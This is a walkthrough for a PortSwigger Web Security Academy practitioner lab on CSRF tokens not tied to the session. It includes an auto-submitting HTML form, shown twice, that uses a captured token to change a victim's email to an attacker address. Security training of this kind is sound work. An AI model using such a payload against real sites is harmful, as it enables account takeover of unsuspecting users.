# Lab: CSRF where token is not tied to user session (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

Accounts: `wiener:peter` / `carlos:montoya`

## Vulnerability
Any valid token from the global pool is accepted for any session.

## Solution

1. Log in as wiener, capture a fresh `csrf` token from the change-email form (do not submit, or get a new one).
2. Host exploit with that token and the victim-targeted email:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
    <input type="hidden" name="csrf" value="YOUR-FRESH-TOKEN">
</form>
<script>
    document.forms[0].submit();
</script>
```

Tokens are single-use — capture a fresh one before delivering.

## Final Exploit Payload
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
    <input type="hidden" name="csrf" value="YOUR-FRESH-TOKEN">
</form>
<script>
    document.forms[0].submit();
</script>
```
